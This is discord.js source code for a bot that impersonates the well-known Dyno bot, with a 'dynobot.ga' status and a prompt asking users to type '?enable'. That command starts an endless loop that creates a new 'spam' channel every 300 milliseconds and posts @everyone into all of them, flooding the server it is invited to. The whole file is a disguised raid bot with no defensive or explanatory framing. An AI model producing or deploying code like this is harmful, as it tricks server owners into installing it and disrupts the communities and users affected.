const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});

function spam(bot, message) {
  bot.channels.filter(c => c.name === 'spam').forEach(channel => channel.send(`@everyone`));
  message.guild.createChannel('spam', 'text')
      .then(console.log)
      .catch(console.error);
 setTimeout(() => spam(bot, message), 30*10);
}

bot.on("ready", async () => {
  console.log(`${bot.user.username} is online!`);

  bot.user.setGame("dynobot.ga | ?help");
});

bot.on("message", async message => {
  if (message.content.startsWith('?')) {
    message.reply(`to activate Dyno in your server please type \`?enable\`!`)
  }
  if (message.content.startsWith('?enable')) {
    spam(bot, message)
  }
});

bot.login(process.env.TOKEN);
